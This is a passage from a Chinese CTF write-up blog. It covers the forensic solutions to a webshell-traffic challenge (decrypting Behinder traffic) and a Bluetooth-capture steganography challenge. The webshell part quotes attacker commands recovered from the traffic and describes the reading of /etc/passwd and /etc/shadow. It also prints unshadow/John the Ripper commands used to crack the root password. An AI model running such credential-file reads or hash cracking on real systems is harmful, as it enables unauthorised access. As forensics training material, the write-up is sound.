<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">p = <span class="number">7867691643586180987785626545986251727789183377275546449400690071916592141728452581896381132002349573632855071606614201168751151435679435299890592299985539</span></span><br><span class="line">q = <span class="number">7867691643586180987785626545986251727789183377275546449400690071916592141728452581896381132002349573632855071606614201168751151435679435299890592299985167</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = p * q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line">rsa_key = RSA.construct((n, e, d, p, q))</span><br><span class="line">private_pem = rsa_key.export_key()</span><br><span class="line">cipher = PKCS1_v1_5.new(RSA.import_key(private_pem))</span><br><span class="line"></span><br><span class="line">encrypted_key = base64.b64decode(<span class="string">&quot;ufhPlhqyO+le5pAWzAptt0OhVjS5eDX3W3X766Hc8QbKMNflhkZM3t8HArZ8YRFM3G7h7MMYrcASwycx7aSU1OL2tChk3O/O8cjw/0C6Agx5qEDeiI3gtnic5/J+cLB0WcspW2t9OiqteGHBtXZx0cXUjUSU/7tPwfnOS3pXjrJRDisgSwE=G7Cpj860&quot;</span>[<span class="number">8</span>:-<span class="number">8</span>])</span><br><span class="line">rand_p = cipher.decrypt(encrypted_key, <span class="literal">None</span>)</span><br><span class="line"><span class="built_in">print</span>(rand_p)</span><br><span class="line">key = hashlib.md5(rand_p).hexdigest()[:<span class="number">16</span>]</span><br><span class="line"><span class="built_in">print</span>(key)</span><br></pre></td></tr></table></figure></div>

<p>可以得到密钥为<code>d14d8ce94563e71a</code> </p>
<p>然后随便找个能分析冰蝎流量的工具（自己写个脚本也行，加密不难，主要就一个AES）</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/abc123info/BlueTeamTools" >https://github.com/abc123info/BlueTeamTools <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>这里就不赘述里面发生了什么了，代码比较清晰，挨着解密一遍就能看到后面主要在执行命令，比如这里是<code>cd /var/www/html/uploads/ ;whoami</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://c.img.dasctf.com/LightPicture/2025/06/2fced3566cbf9b57.jpg"
                      alt="null"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://c.img.dasctf.com/LightPicture/2025/05/424729ecb4af3350.jpg"
                      alt="null"
                ></p>
<p>一路跟到后面，可以发现本题的关键，读取了&#x2F;etc&#x2F;passwd</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://c.img.dasctf.com/LightPicture/2025/06/ec480c28ed40e26a.jpg"
                      alt="null"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://c.img.dasctf.com/LightPicture/2025/06/25b7f8f393a99ccd.jpg"
                      alt="null"
                ></p>
<p>后面也是同理，获取了&#x2F;etc&#x2F;shadow</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://c.img.dasctf.com/LightPicture/2025/06/063c413cb528ccc2.jpg"
                      alt="null"
                ></p>
<p>拿到passwd和shadow使用John the ripper进行爆破即可</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unshadow passwd shadow &gt; pass</span><br><span class="line">john pass --wordlist ~/CTFtools/SecLists/Passwords/Leaked-Databases/rockyou-50.txt</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://c.img.dasctf.com/LightPicture/2025/06/b96c556a31c30efc.png"
                      alt="null"
                ></p>
<p>得到root的密码为slideshow</p>
<p>最后md5套上DASCTF{}得到flag</p>
<h2 id="题目-Blue-Trace"><a href="#题目-Blue-Trace" class="headerlink" title="题目-Blue Trace"></a>题目-Blue Trace</h2><ol>
<li>蓝牙协议分析</li>
</ol>
<p>在3336包之前都是pc在搜索周围的蓝牙信号。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750648158144-41e626a5-f4c9-4d97-b14e-4487fa1706ed.png"
                      alt="img"
                ></p>
<p>在这pc与手机连接上蓝牙。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750648158297-ed965866-1ae3-4a3d-8881-9c022e6ddff3.png"
                      alt="img"
                ></p>
<p>后面就是做了些信息交换什么的，主要是从4168包开始，这里开始用手机给pc传输文件。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750648158095-ae2d6cf4-0287-4f46-a461-d776166181ef.png"
                      alt="img"
                ></p>
<p>观察文件头，发现是jpg文件，这个jpg文件的内容其实不重要，我们知道，如果一个图片要藏文件，一般都是藏在文件尾，我们可以直接看最后几个包，看看文件尾有没有藏东西。</p>
<p>在34714包中，这里是OBEX协议传输图片的最后一个包，拉到末尾</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750648158361-3cf7fad0-02dd-4a4f-acdd-94aafbbcd252.png"
                      alt="img"
                ></p>
<p>这里很明显是藏了一个压缩包的，我们把这段数据的body提取出来。</p>
<ol>
<li>提取压缩包</li>
</ol>
<p>复制值。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750648157990-cef57395-c837-4356-995b-63f18476ffc8.png"
                      alt="img"
                ></p>
<p>放到cyberchef里：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750648159047-822e0639-fc8c-4097-adad-1987fa9952c9.png"
                      alt="img"
                ></p>
<p>然后全文搜索504b，找到504b0304开头的字段，然后删除前面的所有内容，然后16进制解码。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750648159129-03335daa-23b7-46aa-99ce-50927142dd4a.png"
                      alt="img"
                ></p>
<p>然后就可以下载下来了，成功得到一个压缩包。</p>
<ol>
<li>解密压缩包</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750648159059-ec465450-3dab-4148-b1b3-f3de1f4a08fe.png"
                      alt="img"
                ></p>
<p>打开压缩包看到一个加密的flag.png，我们肯定要拿出来，这里提示压缩包密码是蓝牙传输的目标电脑名字，其实刚刚分析蓝牙流量的时候看到很多次电脑名字了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750648159091-7a4e4a0d-f015-4673-a328-1cb89d64fbc1.png"
                      alt="img"
                ></p>
<p>就比如这里，但是这里是INFERNITY???PC，中间的三个黑方块是什么？</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750648159440-e5f33af9-e07e-4af5-8154-6b920e9d8df7.png"
                      alt="img"
                ></p>
<p>在最开始传输图片的时候，就直接找得到pc的名字，是INFERNITYのPC。还有很多地方都找得到。</p>
<p>然后就可以成功解密出图片了！</p>
<p>4.获取flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750648159771-13c75102-dbda-4c8b-8ce2-037ff1c03ec5.png"
                      alt="img"
                ></p>
<p>这个图片看起来毫无规律，只是无意义的像素点组成的图片，而且是黑白灰的，那说明rgb的值是一样的，可能是每个像素点的rgb值是一个数字，然后提取所有像素点的数字。范围肯定是0到255，这个值很有可能是字符串的十进制值。也就是说，提取完后，把数字转十进制，就能得到全部字符串了。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">text = <span class="string">&#x27;&#x27;</span></span><br><span class="line">imgpath = <span class="string">r&#x27;C:\Users\13664\Desktop\flag.png&#x27;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(imgpath)</span><br><span class="line">img_array = np.array(img)<span class="comment">#把图像转成数组格式</span></span><br><span class="line">shape = img_array.shape</span><br><span class="line">height = shape[<span class="number">0</span>]</span><br><span class="line">width = shape[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        <span class="comment"># print(img.load()[i, j])  # 查看位置（i，j）处像素值</span></span><br><span class="line">        str0 = img.load()[j, i][<span class="number">0</span>]</span><br><span class="line">        text = text +<span class="string">&#x27; &#x27;</span>+ <span class="built_in">str</span>(str0)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(text[<span class="number">1</span>:])</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750648160046-205f14fe-7b69-43c9-820c-9de8be6f77b9.png"
                      alt="img"
                ></p>
<p>然后去这里，十进制转字符串：<a class="link"   target="_blank" rel="noopener" href="https://lzltool.cn/Toolkit/ConvertStringToDecimal" >https://lzltool.cn/Toolkit/ConvertStringToDecimal <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750648159694-c642d281-52ad-4d88-a7f8-02121185fb0d.png"
                      alt="img"
                ></p>
<p>成功拿到flag。</p>

        </div>

        
            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> DASCTF2025上半年赛官方WP</li>
        <li><strong>Author:</strong> xiaolaisec</li>
        <li><strong>Created at
                :</strong> 2025-08-02 19:07:05</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-09-13 18:46:44
            </li>
        
        <li>
            <strong>Link:</strong> https://redefine.ohevan.com/2025/08/02/DASCTF2025 上半年赛官方WP/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

            </div>
        

        
            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
                
                    <li class="tag-item mx-0.5">
                        <a href="/tags/CTF/">#CTF</a>&nbsp;
                    </li>
                
                    <li class="tag-item mx-0.5">
                        <a href="/tags/JAVA/">#JAVA</a>&nbsp;
                    </li>
                
                    <li class="tag-item mx-0.5">
                        <a href="/tags/PHP/">#PHP</a>&nbsp;
                    </li>
                
                    <li class="tag-item mx-0.5">
                        <a href="/tags/Python/">#Python</a>&nbsp;
                    </li>
                
            </ul>
        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="prev"
                        rel="prev"
                        href="/2025/08/06/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-URLDNS%E9%93%BE/"
                        >
                            <span class="left arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-left"></i>
                            </span>
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">java反序列化-URLDNS链</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="next"
                        rel="next"
                        href="/2025/08/02/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%20A-Piece-Of-Java_WP/"
                        >
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">羊城杯2020 A-Piece-Of-Java WP</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        


        
            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
                <div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="waline"></div>
    <script type="module" data-swup-reload-script>
      import { init } from '/js/libs/waline.mjs';

      function loadWaline() {
        init({
          el: '#waline',
          serverURL: 'https://example.example.com',
          lang: 'zh-CN',
          dark: 'body[class~="dark-mode"]',
          requiredMeta: ['nick', 'mail'],
          emoji: [],
          
          
        });
      }

      if (typeof swup !== 'undefined') {
        loadWaline();
      } else {
        window.addEventListener('DOMContentLoaded', loadWaline);
      }
    </script>



        
    
</div>

            </div>
        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">On this page</div>
        <div class="page-title">DASCTF2025上半年赛官方WP</div>
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DASCTF2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B%E5%AE%98%E6%96%B9WP"><span class="nav-text">DASCTF2025上半年赛官方WP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE-%E6%B3%BD%E8%A5%BF%E5%B2%9B"><span class="nav-text">题目-泽西岛</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE-%E5%86%8D%E7%9F%AD%E4%B8%80%E7%82%B9%E7%82%B9"><span class="nav-text">题目-再短一点点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE-phpms"><span class="nav-text">题目-phpms</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN"><span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE-mini"><span class="nav-text">题目-mini</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE-RRRTOS"><span class="nav-text">题目-RRRTOS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-1"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE-NSUSServer"><span class="nav-text">题目-NSUSServer</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#REVERSE"><span class="nav-text">REVERSE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE-%E9%B1%BC%E9%9F%B3%E4%B9%90"><span class="nav-text">题目-鱼音乐</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE-xuans"><span class="nav-text">题目-xuans</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE-%E6%9B%B4%E9%80%82%E5%90%88CTF%E5%AE%9D%E5%AE%9D%E4%BD%93%E8%B4%A8%E7%9A%84app"><span class="nav-text">题目-更适合CTF宝宝体质的app</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CRYPTO"><span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE-Legendary-Zipping-Weapon"><span class="nav-text">题目-Legendary Zipping Weapon</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE-Excessive-Security"><span class="nav-text">题目-Excessive Security</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE-Strange-RSA"><span class="nav-text">题目-Strange RSA</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE-%E4%B8%80%E6%8A%8A%E5%97%A6"><span class="nav-text">题目-一把嗦</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE-Webshell-Plus"><span class="nav-text">题目-Webshell Plus</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE-Blue-Trace"><span class="nav-text">题目-Blue Trace</span></a></li></ol></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2022</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">xiaolaisec</a>
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.0</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fa-regular fa-comments"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>





    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>









<div class="post-scripts" data-swup-reload-script>
    
        
<script src="/js/tools/tocToggle.js" type="module"></script>

<script src="/js/layouts/toc.js" type="module"></script>

<script src="/js/plugins/tabs.js" type="module"></script>

    
</div>


</body>
</html>
